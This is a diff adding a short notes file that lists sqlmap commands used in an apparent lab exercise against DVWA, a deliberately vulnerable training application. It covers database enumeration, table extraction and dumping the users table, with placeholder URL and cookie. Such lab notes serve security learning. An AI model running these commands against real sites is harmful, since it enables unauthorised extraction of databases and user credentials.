@@ -1,0 +1,25 @@
+
+
+
+# 📁 2. commands.txt (COPY THIS)
+
+```text
+SQLMap Commands Used:
+
+1. Database Enumeration:
+python sqlmap.py -u "URL" --cookie="COOKIE" --dbs
+
+2. Tables Extraction:
+python sqlmap.py -u "URL" --cookie="COOKIE" -D dvwa --tables
+
+3. Data Dump:
+python sqlmap.py -u "URL" --cookie="COOKIE" -D dvwa -T users --dump
+
+4. Banner:
+--banner
+
+5. Users:
+--users
+
+6. Privileges:
+--privileges
